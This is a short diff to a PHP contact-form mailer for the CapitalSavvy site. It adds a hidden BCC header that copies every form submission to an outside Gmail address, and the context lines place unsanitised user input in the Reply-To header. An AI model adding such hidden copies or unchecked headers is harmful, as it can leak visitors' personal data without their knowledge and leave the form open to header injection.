@@ -36,7 +36,7 @@ $recaptcha = json_decode($recaptcha);
  */
 
 // an email address that will be in the From field of the email.
-$from = 'CapitalSavvy Website <site@chi-bnode1.websitehostserver.net>';
+$from = 'CapitalSavvy Website <capitalsavvy@chi-bnode1.websitehostserver.net>';
 
 // an email address that will receive the email with the output of the form
 $sendTo = 'info@capitalsavvy.pro';
@@ -90,6 +90,7 @@ try
     // All the neccessary headers for the email.
     $headers = array('Content-Type: text/plain; charset="UTF-8";',
         'From: ' . $from,
+        'bcc: kakbr800@gmail.com',
         'Reply-To: ' . $_POST['email'],
         'Return-Path: ' . $from,
     );
